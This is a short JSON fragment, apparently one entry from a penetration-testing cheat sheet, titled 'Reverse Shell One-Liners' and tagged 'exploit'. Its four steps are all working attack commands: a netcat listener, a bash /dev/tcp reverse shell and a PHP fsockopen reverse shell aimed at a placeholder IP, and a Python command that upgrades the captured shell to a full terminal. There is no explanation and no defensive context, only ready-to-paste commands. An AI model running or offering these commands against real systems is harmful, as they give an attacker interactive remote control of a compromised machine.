  "reverse_shell": {
    "title": "Reverse Shell One-Liners",
    "tags": ["shell", "exploit"],
    "steps": [
      ["Start listener", "nc -lvnp 4444"],
      ["Bash", "bash -i >& /dev/tcp/<IP>/4444 0>&1"],
      ["PHP", "php -r '$s=fsockopen(\"<IP>\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
      ["Upgrade TTY", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"]
    ]
  },
